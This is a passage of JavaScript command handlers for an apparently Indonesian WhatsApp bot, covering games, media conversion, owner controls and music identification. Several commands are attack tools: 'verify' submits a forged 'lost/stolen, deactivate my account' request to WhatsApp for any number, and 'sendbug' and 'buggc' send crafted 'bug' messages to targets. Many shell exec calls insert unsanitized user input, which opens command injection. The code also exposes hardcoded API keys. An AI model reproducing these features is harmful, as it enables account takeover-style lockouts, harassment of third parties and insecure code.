if (conn.math[id]) await setReply(`Waktu habis!\nJawabannya adalah ${math2.result}\n\n${math2.mode.toUpperCase()}\n\nmath ${math2.mode}`)
delete conn.math[id]
}, math2.time)
]
}
break

case 'setimgdoc':{
if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
if(isImage || isQuotedImage){
let delb = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
await fse.copy(delb,`./stik/thumbnaildokumen.jpg`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah image doc`)
} else {
setReply(`Kirim gambar dengan caption ${prefix+command}`);
}
}
break 

case 'caklontong':{
if (!isGroup) return setReply(mess.only.group)
let timeout = 180000
let poin = 500
let tiketcoin = 1
let id = m.chat
if (id in conn.caklontong) return setReply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = `
${json.soal}

Timeout *${(timeout / 1000).toFixed(2)} detik*
Ketik ${prefix}calo untuk bantuan
Bonus: ${poin} XP
Tiketcoin: ${tiketcoin} TiketCoin
`.trim()
conn.caklontong[id] = [
await setReply(caption),
json, poin,
setTimeout(() => {
if (conn.caklontong[id]) setReply(`Waktu habis!\nJawabannya adalah *${json.jawaban}*\n${json.deskripsi}`)
delete conn.caklontong[id]
}, timeout)
]
}
break

case 'addcmdowner':{
if (!isOwner) return onlyOwner()
if(!q) return setReply(mess.query)
if(_data.checkDataId("commands", q,  DataId)) return setReply("User sudah menjadi owner")
if(!_data.checkDataName("commands", q, DataId)) { await _data.createDataId("commands", DataId) }
_data.addDataId(q, "commands", DataId)
setReply(`Berhasil menambahkan ${q} ke daftar fitur owner`)
}
break

case 'delcmdowner':
if(!q) return setReply(mess.query)
if (!isOwner) return onlyOwner()
try {
if(!_data.checkDataId("commands", q, DataId)) return setReply(`User bukan owner`)
_data.removeDataId ("commands", q, DataId)
setReply(`Berhasil menghapus ${q} ke daftar fitur owner`)
} catch (err){
console.log(err)
setReply(`${err}`)
}
break

case 'listcmdowner':{
let nana = await DataId.filter(item => item.name == "commands" )
let teks ="List Commands For Owner\n"
let nunu = nana[0].id
for(let i of nunu){
teks +=`. ${i}\n`
}
setReply(teks)
}
break


case 'addcmdprem':{
if (!isOwner) return onlyOwner()
if(!q) return setReply(mess.query)
if(_data.checkDataId("premium", q,  DataId)) return setReply("Command sudah ada di database")
if(!_data.checkDataName("premium", q, DataId)) { await _data.createDataId("premium", DataId) }
_data.addDataId(q, "premium", DataId)
setReply(`Berhasil menambahkan ${q} ke daftar fitur premium`)
}
break

case 'delcmdprem':
if(!q) return setReply(mess.query)
if (!isOwner) return onlyOwner()
try {
if(!_data.checkDataId("premium", q, DataId)) return setReply("Command tidak ada di database")
_data.removeDataId ("premium", q, DataId)
setReply(`Berhasil menghapus ${q} ke daftar fitur premium`)
} catch (err){
console.log(err)
setReply(`${err}`)
}
break

case 'listcmdprem':{
if(!_data.checkDataName("premium", q, DataId)) { await _data.createDataId("premium", DataId) }
let nana = await DataId.filter(item => item.name == "premium" )
let teks ="List Command For Premium User\n\n"
let nunu = nana[0].id
for(let i of nunu){
teks +=`• ${toFirstCase(i)}\n`
}
teks +=`\n• Total: ${nunu.length}\n`
setReply(teks)
}
break


case  'addcmdlimit':{
if (!isOwner) return onlyOwner()
if(!q) return setReply(mess.query)
if(_data.checkDataId("limit", q,  DataId)) return setReply("Command sudah ada di database")
if(!_data.checkDataName("limit", q, DataId)) { await _data.createDataId("limit", DataId) }
_data.addDataId(q, "limit", DataId)
setReply(`Berhasil menambahkan ${q} ke daftar fitur limit`)
}
break

case  'delcmdlimit':
if(!q) return setReply(mess.query)
if (!isOwner) return onlyOwner()
try {
if(!_data.checkDataId("limit", q, DataId)) return setReply("Command tidak ada di database")
_data.removeDataId ("limit", q, DataId)
setReply(`Berhasil menghapus ${q} ke daftar fitur limit`)
} catch (err){
console.log(err)
setReply(`${err}`)
}
break

case 'listcmdlimit':{
let nana = await DataId.filter(item => item.name == "limit" )
let teks ="List Commands For limit\n"
let nunu = nana[0].id
for(let i of nunu){
teks +=`. ${i}\n`
}
setReply(teks)
}
break


case 'outdate':{
if (!itsMe && !isOwner) return onlyOwner()
exec("npm outdate --json", async (err, stdout) => {
if (err) return setReply(`${copyright}:~ ${err}`)
let listSerch = []
let teskd = `\n Berikut adalah module yang belom di update\n`
let yaya = JSON.parse(stdout)
let nana = Object.keys(yaya)
let nono = Object.entries(yaya)
for (let i of nana) {
listSerch.push({
title: i,
rowId: `${prefix}exec npm i ${i}@${yaya[i].latest}`,
description: `🔖 V${yaya[i].current} => V${yaya[i].latest}`
 })
}
const sections = [
{
title: "Total Version " + nana.length,
rows: listSerch
}
]
const listMessage = {
text: teskd,
footer: copyright,
title: `*List Version*`,
buttonText: "TAP",
sections
}
conn.sendMessage(from, listMessage, {quoted: m})
})
}
break


case 'delchat':
await conn.chatModify({
delete: true,
lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]
},
from)
setReply("Sukses")
break
    

case 'clearallerror':
if (!isOwner) return onlyOwner()
setReply("SukseS clear all error")
_error.clear(listerror)
break

case 'listerror': {
let errornye = `*List Error*\nJumlah : ${db.data.listerror.length}\n\n`
for (let i of db.data.listerror){
errornye += `_*Command*_ : ${i.cmd}\n_*System Error*_ : ${i.error}\n\n*]─────────────────[*\n\n`
}
errornye += `© ${fake1}`
setReply(errornye)
}
break

case 'listonline': {
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(store.presences[id]), botNumber]
conn.sendText(from, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
}
break


case 'listblock':{
let block = await conn.fetchBlocklist()            
setReply('List Block:\n\n' + `Total: ${block == undefined ? '*0* Diblokir' : '*' + block.length + '* Diblokir'}\n` + block.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`)
}
break 

/*case 'owner':{

let teks = `
––––––『 *OWNER BOT* 』––––––
⭔ *Nama* : ${ownerName}
⭔ *Nomor* : wa.me/${nomerOwner}
⭔ *Gender* : Boys ♂
⭔ *Agama* : Islam
⭔ *Tanggal lahir* : Private 🥶
⭔ *Umur* : 100 tahun
⭔ *Hobby* : explore the forest
⭔ *Sifat* : Wibu, Tukang Satir, Bilek, Prik, Nolep
⭔ *Tinggal* : Sleman
⭔ *Waifu* : Yui - Hirasawa , Tsukasa Yuzaki, Onodera
•·–––––––––––––––––––––––––·•
📮 *Note:* ↓
• Owner berhak blockir tanpa alasan
• Berbicaralah yang sopan & tidak spam
• Owner Hanya merespon yang berkaitan dengan BOT
• No Call jika tidak penting
•·–––––––––––––––––––––––––·•

`
let teks2 =`${copyright} - ${calender}`


let sol = await conn.fetchStatus(nomerOwner+'@s.whatsapp.net' )
let ppimgUrl = await conn.profilePictureUrl(nomerOwner+'@s.whatsapp.net'  , 'image')

let contextInfo = {
forwardingScore: 50, 
isForwarded: true, 
externalAdReply:{
showAdAttribution: false, 
title: `${ownerName}`,
body:sol.status,
previewType:"PHOTO",
sourceUrl: `https://wa.me/${nomerOwner}`,
thumbnail: fs.readFileSync('./stik/reply.jpg'),
thumbnailUrl: ppimgUrl
}
}

let mok = [
{"buttonId": `${prefix}dashboard`,"buttonText": {"displayText": `ᴅᴀsʜʙᴏᴀʀᴅ`},"type": "RESPONSE"},
{"buttonId": `${prefix}sewa`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"},
]
conn.sendButDoc(from, teks,teks2,null, mok,contextInfo , {quoted: setQuoted},"xlsx")


}
break   
*/ 
case 'afk':{
if (!isGroup) return setReply(mess.only.group)
if(!q) return setReply("Alasan afk afa ?")
let user = global.db.data.users[m.sender]
user.afk = + new Date
user.afkReason = q
setReply(`${pushname} telah AFK dengan alasan ${q ? ': ' + q : ''}`)
}
break 

/*case  'lmit':   
  case 'limit':
case 'ceklimit': 
if(mentionByReply){
let nomer = mentionByReply.split("@")[0]
setReply(`*${await conn.getName(mentionByReply)}*\n\nLimit : ${isPremium ? 'Unlimited' : `${db.data.users[mentionByReply].limit}/${limitCount}`}\nLimit Game : ${db.data.users[mentionByReply].glimit}/${gcount}\nSaldo : Rp ${db.data.users[mentionByReply].balance.toLocaleString()}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`) 
} else {   
setReply(`*${pushname}*\n\nLimit : ${isPremium ? 'Unlimited' : `${db.data.users[sender].limit}/${limitCount}`}\nLimit Game : ${db.data.users[sender].glimit}/${gcount}\nSaldo : Rp ${db.data.users[sender].balance.toLocaleString()}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
}
break*/

case 'newupdate':
case   'newinfo':{
if(!q) return setReply("Masukan info terbaru")
let data = global.db.data.others['newinfo']
if(data){
data.info = q
data.lastinfo = + new Date
setReply("Berhasil memperbarui info update")
} else{ global.db.data.others['newinfo'] = {
info:q,
lastinfo:+ new Date,
}
setReply("Berhasil memperbarui info update")
}
}
break

/*case 'linkgc':{
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return reply(mess.Badmin)
let Url = await conn.groupInviteCode(from).catch(() => seReply(mess.error.api))
let asu = 'https://chat.whatsapp.com/'+Url
setReply(asu)
}
break*/
    

case 'getsesi': {
const JSZIP = require('jszip')
const zip = new JSZIP();
if (!isOwner) return setReply(mess.only.owner)
setReply("Getting session file...")
const readSession = await fs.readdirSync(`./session`);
const folder = zip.folder("session");
for (let json of readSession) {
const jsonSession = await fs.readFileSync(`./session/${json}`);
folder.file(json, jsonSession);
}
let jpegThumbnail = fs.readFileSync("./stik/thumbnaildokumen.jpg")
let file = `./session.zip`
zip.generateNodeStream({ type: 'nodebuffer', streamFiles: true })
.pipe(fs.createWriteStream(`./session.zip`))
.on('finish', async () => {
let media = fs.readFileSync(file)
await conn.sendMessage(m.chat, { document: media, fileName: "Session file", mimetype: 'application/zip'  ,  jpegThumbnail  }, { quoted: m })
await fs.unlinkSync(file)
})
}
break

case 'ttp':{
if (!isGroup) return setReply(mess.only.group)
const text2png = require('text2png');
await fs.writeFileSync('out.png', text2png(q, {font: '100px coolvetica rg',
localFontPath: 'src/font/coolvetica rg.otf',
localFontName: 'coolvetica rg',
color: 'white',
textAlign: "left",
lineSpacing: 10,
strokeColor: "black",
strokeWidth : 2,
padding: 20}))
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = fs.readFileSync('out.png')
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await conn.sendMessage(from,{sticker: nah},{quoted: m})
await fs.unlinkSync(stok)
await fs.unlinkSync('out.png')
}
break

case 'attp':
if (!isGroup) return setReply(mess.only.group)
try {
if (args.length == 0) return setReply(`Example: ${prefix + command} YUconn`)
//let buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
await conn.sendMessage(from, {sticker: {url:`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}` }}, { quoted: m })
} catch (e) {
setReply(`Maap sedang error coba lagi besok`)
}
break

case 'inspect':{
if (!isGroup) return setReply(mess.only.group)
const rex1 = /chat.whatsapp.com\/([\w\d]*)/g;
let code = q.match(rex1);
if (code === null) return  setReply("No invite url detected.");
code = code[0].replace("chat.whatsapp.com/", "");
let nana = await conn.groupGetInviteInfo(code)
//console.log(nana)
let { id, subject,creator,creation,desc,descId } = await conn.groupGetInviteInfo(code).catch(async () => {
return setReply("Invalid invite url.");
});
let text =
`Subject: ${subject}\nGroupId: ${id}${creator ? `\nCreator: ${creator.split("@")[0]}` : ""}
Create At: ${new Date(creation * 1000).toLocaleString()}` +`${desc ? `\nDesc: ${desc}\nDescId: ${descId}` : ""}`
setReply(text)

}
break

case 'rules':{
	let teks =`
	Syarat dan Ketentuan menggunakan *${fake}*
	
	1. Nama dan nomer user ${fake}
		 akan Kami simpan di dalam 
		 server selama bot aktif
		 
	2. Data akan di hapus ketika bot Offline
		 atau di hapus oleh Owner Bot
	
	3. Kami tidak menyimpan gambar, 
		 video, file, audio, dan dokumen 
		 yang kamu kirim ke ${fake}
		 
	4. Kami tidak akan pernah meminta users 
		 untuk memberikan informasi pribadi
		 
	5. Jika menemukan Bug/Error silahkan 
		 langsung lapor ke Owner atau Developer
		 atau bisa juga memakai fitur _*reportbug*_
		 
	6. Beberapa fitur mungkin ada yang error, 
		 jadi tunggu sampai developer 
		 meperbaiki fitur tersebut
			 
	8. Bot ini sudah di lengkapi dengan
		 fitur _*Auto Report Bug*_ jika terjadi
		 error maka bot akan auto report ke
		 developer, terkecuali error yang
		 menyebabkan bot mati, maka user
		 harus lapor ke developer
		 
	7. Bot ini juga sudah di lengkapi dengan 
		 Fitur Anti Spam jika kamu terdeteksi 
		 melakukan spam, maka Bot tidak
		 akan menanggapi kamu selama 20 detik
		
	9. User dilarang keras menelpon bot!
		 jika melanggar maka kamu akan terkena 
		 banned,block dan dikirim bug
	
	10. Bot tidak akan menanggapi user yang
		   meminta untuk di save nomernya`
	
	let mok = [{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"},
						{"buttonId": `${prefix}dashboard`,"buttonText": {"displayText": `ᴅᴀsʜʙᴏᴀʀᴅ`},"type": "RESPONSE"}]
						
	conn.sendButImage(from, teks, `© Extream`, fs.readFileSync('./stik/bot.jpg'), mok, {quoted: dev})             
	}
	break

 case 'speedtest': case '.':{
let cp = require('child_process')
let { promisify } = require('util')
let exec2 = promisify(cp.exec).bind(cp)
await setReply("_Testing Speed..._")
let o
try {
o = await exec2('python speed.py')
} catch (e) {
o = e
} finally {
let { stdout, stderr } = o
if (stdout.trim()) setReply(stdout)
if (stderr.trim()) setReply(stderr)
}
}
break

 
case 'hode':
if (!isGroup) return setReply(mess.only.group)
 if(isQuotedAudio) { 
setReply(mess.wait)
let medok = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${medok} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(medok)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await xdev.sendMessage(from, {mimetype: 'audio/mp4', audio: buffer453}, { quoted: dev })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break
case 'volume':
if (!isGroup) return setReply(mess.only.group)
if (Number(args[0]) >= 11) return setReply("Maksimal volume adalah 10")
if (isQuotedAudio){ 
setReply(mess.wait)
let media3 = await xdev.downloadAndSaveMediaMessage(quoted)
let rname = getRandom('.mp3')
exec(`ffmpeg -i ${media3} -filter:a "volume=${args[0]}" ${rname}`, async (err, stderr, stdout) => {
if (err) return setReply('Error! Mungkin pakai angka Contoh : .volume 5\n\n*Note :* Volume 1 sampai 10')
let jadie = fs.readFileSync(rname)
await xdev.sendMessage(from, {audio: jadie, mimetype: 'audio/mp4' }, {quoted: dev})
fs.unlinkSync(rname)
fs.unlinkSync(media3)
}
)
} else {
setReply('Reply audio!')
}
break                      
case 'ghost':
if (!isGroup) return setReply(mess.only.group)
if(isQuotedAudio) { 
setReply(mess.wait)
let mele = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${mele} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(mele)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await xdev.sendMessage(from, {mimetype: 'audio/mp4', audio: buffer453}, { quoted: dev })
fs.unlinkSync(ran)
}) 
} else {
setReply('Reply audionya')
}
break
case 'nightcore':
if (!isGroup) return setReply(mess.only.group)
if(isQuotedAudio) { 
setReply(mess.wait)
let mela = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${mela} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(mela)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await xdev.sendMessage(from, {mimetype: 'audio/mp4',  audio: buffer453}, { quoted: dev })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break
case 'tupai':
if (!isGroup) return setReply(mess.only.group)
if(isQuotedAudio) { 
setReply(mess.wait)
let medoi = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${medoi} -filter:a "atempo=0.8,asetrate=65100" ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(medoi)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await xdev.sendMessage(from, {mimetype: 'audio/mp4',  audio: buffer453}, { quoted: dev })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break
case 'speed': 
case 'ping': {
let timestamp = speed()
let latensi = speed() - timestamp
let neww = performance.now()
let oldd = performance.now()
let teks = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ 
*Info Server*
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

`.trim()
xdev.relayMessage(from, { liveLocationMessage: { 
degreesLatitude: 35.676570,
degreesLongitude: 139.762148,
caption: teks,
sequenceNumber: 1656662972682001, timeOffset: 8600, jpegThumbnail: fs.readFileSync('./stik/reply.jpg'),
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: true,
}
}
}} , { quoted: dev })
}
break
case 'imut':
if (!isGroup) return setReply(mess.only.group)
if(isQuotedAudio) { 
setReply(mess.wait) 
let masa = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${masa} -af atempo=1/2,asetrate=44500*2/1 ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(masa)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await xdev.sendMessage(from, {mimetype: 'audio/mp4', audio: buffer453}, { quoted: dev })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break

case 'kalkulator':
if (!isGroup) return setReply(mess.only.group)
const matematik = require('mathjs')
try{
let nana = q.replace("x","*")
let nunu = matematik.evaluate(nana)
let teks = `${q} = ${nunu}`
setReply(teks)
} catch (err){
setReply( 'Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
}
break

case 'transfer':{
if(!q) return setReply("Masukan angka")
if (isNaN(q)) return setReply(`Harus berupa angka`)
if(!mentionByReply) return setReply("Reply tatgetnya")
let ane = Number(math(q))
if (db.data.users[sender].balance < ane) return setReply(`Saldo kamu tidak mencukupi`)
db.data.users[mentionByReply].balance = ane
db.data.users[sender].balance -= ane
setReply(`Berhasil mentransfer saldo ke nomer ${mentionByReply.split("@")[0]} sebesar Rp.${Number(q).toLocaleString()}`)
}
break


case 'toimg': {
if (!isQuotedSticker) return setReply('Reply stickernya')
setReply(mess.wait)
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(err)
let buffer = fs.readFileSync(ran)
await conn.sendMessage(from, {caption: "Nih", image: buffer})
fs.unlinkSync(ran)
})
}
break


case 'tomp4':
if (!isGroup) return setReply(mess.only.group)
if (isQuotedSticker) {
setReply(mess.wait)
let file = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let outGif = `./temp/${getRandom('.gif')}`
let outMp4 = `./temp/${getRandom('.mp4')}`
//convert webp ke gif pakai imagemagick
exec(`convert ${file} ${outGif}`, (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}

//lalu convert gif ke mp4 pakai ffmpeg
exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, async (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}
await conn.sendMessage(from,{video: fs.readFileSync(outMp4), caption: "Nih"},{quoted: m})
fs.unlinkSync(outGif)
fs.unlinkSync(outMp4)
fs.unlinkSync(file)
})
})

}
break


case 'toptt':
if (isQuotedAudio){
setReply(mess.wait)
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply('Gagal mengkonversi audio ke ptt')
let topt = fs.readFileSync(ran)
await conn.sendMessage(from,{audio: topt, mimetype: 'audio/mp4', ptt:true}, {quoted: m})
fs.unlinkSync(ran)
})
} else {
setReply("Reply audio")
}
break


case 'togif':
if ( isQuotedSticker) {
setReply(mess.wait)
let file = await  conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let outGif = `./${getRandom('.gif')}`
let outMp4 = `./${getRandom('.mp4')}`

//convert webp ke gif pakai imagemagick
exec(`convert ${file} ${outGif}`,async (err) => {
await fs.unlinkSync(file)
if (err) {
console.log(err)
return setReply(`${err}`)
}

//lalu convert gif ke mp4 pakai ffmpeg
exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, async (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}
await sendGif(fs.readFileSync(outMp4))
await fs.unlinkSync(outGif)
await fs.unlinkSync(outMp4)

})
})

} else if(isQuotedVideo){
setReply(mess.wait)
let outMp4 = getRandom('.mp4')
let file = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let nana = await fs.readFileSync(file)
await sendGif(nana)
await fs.unlinkSync(file)
}
break

case 'verify':{
if(!q) return setReply("Masukan nomer telepon")
if(!q.startsWith("+")) return setReply("masukan kode negara comtoh +62")
var imel = await (await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")).data[0]
 let data = {
  jazoest: '2954',
  lsd: 'AVotQVSNJiE',
  step: 'articles',
  country_selector: 'BR',
  phone_number: q,
  email: imel,
  email_confirm: imel,
  platform: 'ANDROID',
  your_message: 'Perdido/roubado: desative minha conta',
  __user: '0',
  __a: '1',
  __dyn: '7wKwkHgmwn8K2WnFwn84a2i5U4e1Fx-ewSwMxW0SU1nEhwem0nCq1ewcG0KE33w8G1nzU1vrzo5-0me220qu0L8ly82swdq0Ho2ewnE3fw6iw4vwbS1Lw4Cw',
  __csr: '',
  __req: '7',
  __hs: '19319.BP:whatsapp_www_pkg.2.22.23.85',
  dpr: '1',
  __ccg: 'UNKNOWN',
  __rev: '1006635516',
  __s: 'ng4ktn:fe3p07:ramsmu',
  __hsi: '7169210791910218313',
  __comet_req: '0'
}

let res = await axios({
  url: "https://www.whatsapp.com/contact/noclient/async/",
  method: "POST",
  headers: {
    cookie: "wa_lang_pref=tp_br; wa_ul=cf4df212-78b9-481b-8276-9dc801b280000; wa_csrf=d1BrQRQLuxsm0UE-L-O-wq",
  },
  data: new URLSearchParams(data)+""
}).then(res => res).catch(err => err.response)
return setReply(util.format(JSON.stringify( res.status == 200 ? JSON.parse(res.data.replace("for (;;);", "")):res, null, 2)))
}
break


case 'sendbug':
try{
if(!isOwner) return onlyOwner()
let Pe = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false
console.log(Pe)
if(!Pe ) return setReply("Masukan nomer target")
if(Pe == Ownerin) return setReply("SendBug Gagal")
await setReply("Sending...")
	//await conn.sendKatalog(Pe, virtex8(prefix), virtex8(prefix), thumb, {quoted: setQuoted})
//	let a = await conn.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: dev.id } } })
	//conn.sendMessage(Pe, { text: "halo" }, { quoted: a });
 const muk = [{urlButton: {displayText: `Owner Bot`,url: `https://wa.me/${nomerOwner}`}}, 
{urlButton: {displayText: `Owner Bot`,url: `https://wa.me/${nomerOwner}`}}, 
{urlButton: {displayText: `Owner Bot`,url: `https://wa.me/${nomerOwner}`}}, 
{ quickReplyButton: { displayText: `ᴅᴀsʜʙᴏᴀʀᴅ`, id: `${prefix}dashboard` } },
{ quickReplyButton: { displayText: `ᴅᴀsʜʙᴏᴀʀᴅ`, id: `${prefix}dashboard` } },
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `${prefix}sewa` } }]
conn.send5ButMessage  (Pe, fake, copyright, muk  )
setReply(`Berhasil mengirim Bug ke Nomer ${Pe.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break

   //©from: dennis x haikal
case 'buggc':{
const { proto, generateWAMessageFromContent } = require('baileys')
if (!isOwner) return setReply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (!isGroup) return setReply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
let requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
conn.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break 
	
case 'whatmusic':{
if (!isGroup) return setReply(mess.only.group)
const acrcloud = require("acrcloud");
const acr = new acrcloud({
host: "identify-eu-west-1.acrcloud.com",
access_key: "c9f2fca5e16a7986b0a6c8ff70ed0a06",
access_secret: "PQR9E04ZD60wQPgTSRRqwkBFIWEZldj0G3q7NJuR"
});
if (isQuotedAudio) {
setReply(mess.wait)
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return setReply('Gagal mengkonversi audio ke ptt')
let sample = fs.readFileSync(ran)
acr.identify(sample).then(async metadata => {
if(metadata.status.msg == 'No result') return setReply("Music tidak di temukan")
var res = metadata.metadata.music[0]
let rus = await yts(res.title)
if(rus.all.length == "0") return setReply("Video tidak bisa di download")
let ras = await rus.all.filter(v => v.type == 'video')
let info = await ytdl.getInfo(ras[0].url);
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
let videoID = ras[0].videoId

try{
var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
let yamyam = await getBuffer(`${thumbnya}`)
let aklo = [
{"buttonId": `${prefix}playmp3 ${ras[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${ras[0].url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
]

let teks = `
*RESULT FOUND* 💽

📂 Title: ${res.title}
👤 Artist: ${res.artists !== undefined ? res.artists.map(v => v.name).join(', ') : ''}
💾 Album: ${res.album.name || ''}
🧩 Genres: ${res.genres !== undefined ? res.genres.map(v => v.name).join(', ') : ''}
🌏 Release Date: ${res.release_date}
⏳ Durasi : ${ras[0].timestamp}
🎧 Audio : ${FileSize(audio[0].contentLength)}
🎬 Video : ${FileSize(format.contentLength)}
`
conn.sendButImage(from, teks, `© ${fake1}`, yamyam, aklo, {})
});
fs.unlinkSync(ran)
})
} else if (isQuotedVideo) {
setReply(mess.wait)
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -vn ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let sample = fs.readFileSync(ran)
acr.identify(sample).then(async metadata => {
if(metadata.status.msg == 'No result') return setReply("Music tidak di temukan")
var res = metadata.metadata.music[0]
let rus = await yts(res.title)
if(rus.all.length == "0") return setReply("Video tidak bisa di download")
let ras = await rus.all.filter(v => v.type == 'video')
let info = await ytdl.getInfo(ras[0].url);
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
let videoID = ras[0].videoId

try{
var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
let yamyam = await getBuffer(`${thumbnya}`)
let aklo = [
{"buttonId": `${prefix}playmp3 ${ras[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${ras[0].url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
]

let teks = `
*RESULT FOUND* 💽

📂 Title: ${res.title}
👤 Artist: ${res.artists !== undefined ? res.artists.map(v => v.name).join(', ') : ''}
💾 Album: ${res.album.name || ''}
🧩 Genres: ${res.genres !== undefined ? res.genres.map(v => v.name).join(', ') : ''}
🌏 Release Date: ${res.release_date}
⏳ Durasi : ${ras[0].timestamp}
🎧 Audio : ${FileSize(audio[0].contentLength)}
🎬 Video : ${FileSize(format.contentLength)}
`
conn.sendButImage(from, teks, `© ${fake1}`, yamyam, aklo, {})
});
fs.unlinkSync(ran)
})
} else {
setReply("Reply audio atau video")
}
